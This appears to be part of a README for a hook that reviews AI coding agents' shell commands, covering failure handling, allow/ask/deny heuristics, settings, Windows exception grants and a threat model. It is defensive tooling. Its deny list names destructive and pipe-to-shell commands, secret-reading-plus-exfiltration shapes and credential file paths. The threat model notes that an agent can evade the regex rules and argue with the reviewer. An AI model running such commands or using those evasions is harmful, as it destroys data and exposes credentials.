### Failures and host approval behavior

A guardrail that fails open is worse than no guardrail, because you stop reading
commands on the strength of it. Hosts treat a hook that crashes, times out, or
prints something unparsable as **skipped** — the command runs with no review and
nothing tells you (Antigravity blocks in those cases instead, but runs the
command on empty output; see [its setup](#google-antigravity-setup)). The adapters handle failures as follows; the host's own
permissions still matter if it cannot launch the hook or abandons it:

| If this happens | The result is |
|---|---|
| Reviewer errors, times out, or returns junk | `policy.fail_mode` (`ask` by default) |
| Reviewer hangs past the deadline | Same, enforced by a wall-clock timer rather than the socket timeout |
| A provider is named but has no API key, or is misspelled | Reviewer failure naming the problem — never a silent downgrade to local-only |
| Config file is malformed, or PyYAML is missing | Claude Code asks; Codex, Devin Local, Cascade, and Antigravity block |
| Hook input cannot be parsed | `deny` — a reviewer that cannot read the command cannot clear it |
| The decision cannot be written | JSON adapters attempt a block response or exit 2; Cascade retains exit 2 even if stderr fails |

An `ask` result is translated per the [supported implementation](#supported-implementations):
Devin Local leaves the permission request unresolved so you can decide; Cascade
waits in a desktop confirmation dialog and blocks if it cannot show one;
Antigravity does the same with its own dialog. A failed
hook is not itself a substitute for the host approval gate.

Running with no API key at all is different: that is the documented local-only
mode, and it stays silent.

`policy.timeout_seconds` is a **total** budget, enforced with a hard deadline —
the socket timeout alone cannot stop a server that trickles one byte at a time.
It is clamped to 120 seconds and should stay well under your host's own hook
timeout, because past that the host stops waiting and runs the command
unreviewed.

### Local heuristics

Before any AI reviewer is consulted, the hook runs pattern-based heuristics that
set the local decision (which the external reviewer can raise but not lower,
unless `policy.allow_external_override` is true):

- **Auto-allow** common read-only and test commands: `pwd`, `ls`, `cat`, `echo`,
  `grep`, `wc`, `which`, `git status|diff|log|show|branch`, `--version` checks,
  `pytest` / `npm test` / `go test`, and PowerShell read cmdlets.
- **Ask** for opaque or mutating forms: inline interpreters (`python -c`,
  `node -e`, `powershell -Command`), `cmd /c` / `sh -c`, dependency installs,
  network downloads, file writes/moves/copies, anything touching credentials,
  and **piping output into an interpreter** (`… | bash`). Write, delete, move,
  and copy targets are named in the prompt where they can be parsed.
- **Deny** high-risk shapes (`rm -rf /`, `curl … | sh`, `Invoke-Expression`,
  `-EncodedCommand`, `git reset --hard`, `git push --force`), and any command
  that reads secret material *and* has a way to send it off the machine.

**Chained commands are judged segment by segment.** `cd /tmp && ls` is allowed
because every segment is read-only; `ls && curl … -o x.sh` is not, because one
segment is not. Any unrecognised segment drops the whole command to a prompt.
**A newline is a separator too** — agents routinely emit multi-line commands, and
`cat foo.txt⏎./something-else` is two commands, not a `cat`.

**A read verb does not make a command a read.** The allow-list matches the
leading verb, so anything that runs a *different* program through it is excluded:
command substitution (`cat $(…)`, backticks), process substitution (`<(…)`), and
`system(` — which is what keeps `awk 'BEGIN{system("…")}'` off the allow-list
even though `awk` is on it.

**Command keywords match as whole words.** `rm` does not match inside `--rm`, so
`docker run --rm …` is not treated as a delete; `reg` does not match inside
`regex`.

**Secrets are never auto-allowed.** Paths under `~/.ssh`, `~/.aws/credentials`,
`.env` files, `*.pem`, `.npmrc`, `~/.kube/config` and similar force at least an
`ask`, even for a plain `cat`. Public material (`*.pub`, `authorized_keys`,
`known_hosts`) is deliberately not flagged.

Redirects to the **null device** (`2>/dev/null`, `&>/dev/null`) and
file-descriptor dups (`2>&1`) are treated as output discards, **not** file
writes, so `cat notes.md 2>/dev/null` stays auto-allowed. A real redirect
alongside a discard still flags the write and names only the real target.

**Deletes depend on the host.** Claude Code enforces `ask` with a real prompt, so
deletes are `ask` there. Codex treats a `PermissionRequest` `ask` as advisory —
it would not actually gate anything — so deletes are denied there unless the
command is a PowerShell `-WhatIf` dry run or every target is a cleanup artifact
(`__pycache__`, `*.pyc`, `*.pyo`, `*.bak`). Override with
`policy.delete_decision`.

### Settings reference

| Config path | Default | Meaning |
|---|---:|---|
| `reviewer.provider` | `auto` | `claude`, `chatgpt`, `gemini`, `auto`, or `none`. |
| `reviewer.url` | `null` | HTTP endpoint to call with review JSON. Takes precedence over a provider. |
| `reviewer.command` | `null` | Local command receiving review JSON on stdin. Takes precedence over a provider. |
| `providers.<name>.model` | see above | Required for `chatgpt` and `gemini`. |
| `providers.<name>.api_key_env` | per provider | Name of the environment variable holding the key. |
| `providers.<name>.base_url` | vendor default | Point at a gateway or compatible endpoint. |
| `providers.<name>.temperature` | `0` | `null` omits the field for models that reject it. |
| `providers.<name>.extra_body` | `{}` | Merged verbatim into the request body. |
| `policy.fail_mode` | `ask` | What to do if the reviewer fails: `ask` or `deny`. |
| `policy.timeout_seconds` | `20` | Total budget for the reviewer call, enforced as a wall-clock deadline. Clamped to 120; keep it under your host's hook timeout. |
| `policy.allow_readonly` | `true` | Auto-allow obvious read-only commands. |
| `policy.allow_external_override` | `false` | If true, an external `allow` may lift local `ask` for all flags. Hard-deny still wins. |
| `policy.skip_external_when_local_allows` | `false` | Skip the API call when local heuristics already say `allow`. |
| `policy.delete_decision` | `auto` | `auto` resolves per host (deny on Codex, ask on Claude Code). Force with `ask` or `deny`. |
| `policy.log_path` | `null` | Append one JSON line per decision, including silent allows. |
| `exceptions.enabled` | `false` | Windows only. Check exception grants (see [Exception grants](#exception-grants-windows)). |
| `exceptions.grants_path` | `null` | `null` = `C:\ProgramData\cc-ai-review\grants.jsonl`. Must start with a drive letter. |

Corresponding environment variables are the path uppercased with doubled
underscores, e.g. `CC_AI_REVIEW__POLICY__FAIL_MODE`.

## Exception grants (Windows)

Sometimes you want a command the hook blocks or questions to go ahead anyway,
for a while. An **exception grant** allows a list of exact commands, through one
tool name, starting in one folder or repo, for you only, until it expires or you
revoke it. Only you can create one: it takes a UAC prompt plus a confirmation
window that describes the grant in its own words. Design:
`exception-grants-design.md`.

**Set up once** (from your own terminal, not through the AI):

```powershell
& "$env:USERPROFILE\.claude\hooks\cc-ai-review\aiallow.cmd" setup   # UAC prompt
```

then set `exceptions.enabled: true` in your config. `setup` creates
`C:\ProgramData\cc-ai-review`, writable only by administrators, and copies the
grant writer there. `aiallow check` verifies the permissions at any time.

**Workflow:**

1. When the hook blocks a command, its message ends with a ready-made request
   block. Ask the AI: "What permission do you need? Give it a short name."
2. The AI explains in plain language and gives you the block with `name` and
   `why` filled in. Copy the block.
3. Run `aiallow add` in a **separate terminal**. Approve the UAC prompt; the
   grant window reads the clipboard, checks the request, and shows exactly what
   it would allow. You can change the expiry. Click **Approve** (Enter and Esc
   both cancel).
4. Tell the AI to retry.

The request block, as the AI writes it (field rules in the design, section 7.1):

```json
{"v":1,"name":"push-feature-x","commands":["git push --force-with-lease origin feature/x"],
 "tool":"Bash","where":"repo","cwd":"E:\\Source\\proj","hosts":null,"expires":"30m",
 "why":"The rebase rewrote history, so a normal push is rejected."}
```

| Command | What it does |
|---|---|
| `aiallow add` | Approve the request on the clipboard (UAC). |
| `aiallow list` | Your active grants and time left. |
| `aiallow history [--since 7d]` | Grants and revokes, with use counts from the decision log. |
| `aiallow revoke NAME` / `--all` | Revoke your grants (UAC). |
| `aiallow edit` | Repair a broken grants file in a built-in editor, shown as a line diff (UAC). |
| `aiallow setup [--reset]` | Create or update the store; `--reset` keeps the old one as a backup (UAC). |
| `aiallow check` | Check the store's permissions. |

**From inside Claude Code:** you can also run `aiallow` with Claude Code's `!`
prefix, which runs a command you type yourself (the hook doesn't review it).
`!` uses Git Bash on Windows, so give full paths with forward slashes:

```text
! C:/path/to/python.exe C:/Users/<you>/.claude/hooks/cc-ai-review/aiallow.py add
```

The UAC prompt and the grant window appear as usual.

**Limits, by design:**

- Commands match **exactly**, character for character. A different flag, quote
  or space is a different command.
- `where` limits only the **starting folder**, not which files the command
  touches. Exact text doesn't pin down what a command does: a script it runs can
  still change.
- **UAC must be on** (not "Never notify"), and the AI tool must not run
  elevated: grants are ignored for an elevated AI process.
- Hosts that report the tool as `shell` (Codex, Windsurf, Devin, Antigravity)
  can't tell Bash from PowerShell, so such a grant covers either.
- While grants are enabled, the hook denies any AI command that mentions
  `aiallow`, the grant writer, the setup script or the grants folder.
- A custom `grants_path` is an advanced option: `aiallow setup` refuses it, and
  an administrator must create the folder, an empty `grants.jsonl` and a copy of
  `grant-writer.ps1` there with the same permissions as the default store
  (owner Administrators, protected, full control for Administrators and SYSTEM,
  read-and-execute for Users). Then run `aiallow check`.

**Troubleshooting:** `aiallow check` names the exact file or parent folder and
the right that fails the check. Don't loosen a parent folder's permissions to
make it pass; move the store instead. If the grants file is invalid, no grant
applies until you fix it with `aiallow edit`.

## Recommended starting point

The shipped defaults are already the conservative ones — useful explanations
without silently granting broad permissions:

```yaml
policy:
  fail_mode: ask
  allow_external_override: false
  allow_readonly: true
```

For a command like `python -c "... giant one-liner ..."` you should get an `ask`
with a reason resembling:

```text
Inline Python is opaque. The command appears limited to the project and
temporary output, but do not choose "don't ask again" for python -c * because
that would approve arbitrary future Python.
```

Once you trust it, `policy.skip_external_when_local_allows: true` removes the
API call from every read-only command.

## Threat model

**This is a guardrail, not a sandbox.** It helps you decide whether to approve a
command. It does not isolate the filesystem, and it does not stop anything once
you approve.

What it is designed to do:

- stop you rubber-stamping a long command you did not actually read;
- refuse to auto-run commands that read credentials or private keys;
- block a short list of unambiguously destructive shapes outright.

What it explicitly does **not** do:

- defend against an attacker who already controls the agent. A model that wants
  to run something bad can phrase it in ways no regex catches, and the LLM
  reviewer can in principle be argued with;
- review anything but shell commands. File writes via the host's own edit tools,
  network access by other tools, and MCP calls are out of scope;
- guarantee the AI reviewer is right. It is a second opinion, not an oracle. The
  local rules are a floor precisely because the model can be wrong.

Provider choice affects strictness: on the same recursive-delete command,
different models returned `deny`, `ask`, and `allow`. If a specific verdict
matters to you, test it against the model you configure.
